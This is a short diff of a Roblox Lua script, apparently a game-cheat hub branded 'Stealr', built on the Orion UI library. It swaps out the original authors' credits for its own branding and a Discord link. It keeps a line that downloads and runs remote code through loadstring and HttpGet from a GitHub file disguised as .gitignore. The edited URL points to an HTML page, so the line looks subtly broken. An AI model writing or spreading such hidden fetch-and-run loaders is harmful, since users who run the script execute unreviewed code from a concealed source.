@@ -112,11 +112,11 @@ local Tab = Window:MakeTab({
 
 Tab:AddLabel("dsc.gg/stealr")
 wait(2)
-loadstring(game:HttpGet"https://raw.githubusercontent.com/senpaikun123431/AutofarmPrivatev2/main/.gitignore")()
+loadstring(game:HttpGet"https://github.com/senpaikun123431/AutofarmPrivatev2/blob/main/.gitignore")()
 wait(5)
 OrionLib:MakeNotification({
-	Name = "Credits : karya#5055 Benandyager#9031
-	Content = "",
+	Name = "Stealr #1!",
+	Content = "dsc.gg/stealr",
 	Image = "rbxassetid://4483345998",
 	Time = 5
 })
